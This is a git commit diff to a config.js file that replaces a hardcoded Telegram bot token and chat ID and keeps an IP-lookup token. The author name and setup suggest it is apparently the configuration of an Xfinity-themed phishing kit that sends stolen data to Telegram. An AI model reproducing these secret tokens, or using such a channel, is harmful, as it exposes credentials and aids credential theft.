caa15db86fcf7ac2a0db18cae3b703a52ff95f21
xfinitymai <kennethfrady7@gmail.com>
2025-01-31 06:18:58 -0600

    Update config.js

--- config.js
+++ config.js
@@ -1,3 +1,3 @@
-export const TELEGRAM_TOKEN = "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw";
-export const CHAT_ID = 5710607863;
+export const TELEGRAM_TOKEN = "7018256337:AAHX2iHAfXZLAbe8ZYjZfvwDV6EQfYqYX1Y";
+export const CHAT_ID = 7002450305;
 export const IP_TOKEN = "34a50f68edba06";
